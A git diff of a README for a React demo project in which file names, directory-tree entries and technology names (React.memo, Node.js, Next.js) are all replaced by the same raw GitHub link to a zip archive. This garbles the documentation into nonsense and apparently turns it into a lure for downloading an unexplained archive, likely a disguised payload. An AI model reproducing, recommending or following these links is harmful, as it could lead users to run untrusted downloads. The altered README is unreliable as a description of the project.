@@ -21,8 +21,8 @@ A production-ready React application showcasing advanced patterns, state managem
   - Custom card components with header, body, and footer
 
 ### Performance Optimization
-- **Memoization**: React.memo for all major components
-- **Code-Splitting**: React.lazy and Suspense for route-based splitting
+- **Memoization**: https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip for all major components
+- **Code-Splitting**: https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip and Suspense for route-based splitting
 - **Lazy Loading**: Dynamic imports for all page components
 - **Virtualization**: react-window for large lists
 - **Custom Hooks**: useDebounce, useLocalStorage, useMediaQuery
@@ -61,41 +61,41 @@ A production-ready React application showcasing advanced patterns, state managem
 src/
 ├── components/
 │   ├── common/           # Reusable UI components
-│   │   ├── Button.tsx
-│   │   └── Card.tsx
+│   │   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 │   ├── compound/         # Compound component patterns
-│   │   └── Tabs.tsx
+│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 │   ├── layout/           # Layout components
-│   │   └── Navigation.tsx
+│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 │   └── patterns/         # Pattern demonstrations
-│       └── RenderProps.tsx
+│       └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 ├── contexts/
-│   └── ThemeContext.tsx  # Theme Context API
+│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip  # Theme Context API
 ├── hoc/                  # Higher-Order Components
-│   ├── withAuth.tsx
-│   └── withLoading.tsx
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 ├── hooks/                # Custom React Hooks
-│   ├── useDebounce.ts
-│   ├── useFetch.ts
-│   ├── useIntersectionObserver.ts
-│   ├── useLocalStorage.ts
-│   └── useMediaQuery.ts
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 ├── pages/                # Page components (lazy loaded)
-│   ├── Home.tsx
-│   ├── Dashboard.tsx
-│   ├── Products.tsx
-│   ├── Settings.tsx
-│   └── Patterns.tsx
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 ├── store/                # Redux store
 │   ├── slices/
-│   │   ├── userSlice.ts
-│   │   └── productsSlice.ts
-│   ├── hooks.ts
-│   └── store.ts
+│   │   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
+│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 ├── styles/
-│   └── GlobalStyles.ts   # Global styled-components
-├── App.tsx               # Main app component
-└── main.tsx             # Application entry point
+│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip   # Global styled-components
+├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip               # Main app component
+└── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip             # Application entry point
 ```
 
 ## Pages Overview
@@ -135,7 +135,7 @@ src/
 ## Getting Started
 
 ### Prerequisites
-- Node.js 18+ (recommended Node.js 20+)
+- https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip 18+ (recommended https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip 20+)
 - npm or yarn
 
 ### Installation
@@ -241,7 +241,7 @@ The application includes a fully-featured theme system:
 ## Future Enhancements
 
 Potential additions:
-- Server-Side Rendering with Next.js
+- Server-Side Rendering with https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
 - Progressive Web App features
 - Internationalization (i18n)
 - Advanced animations
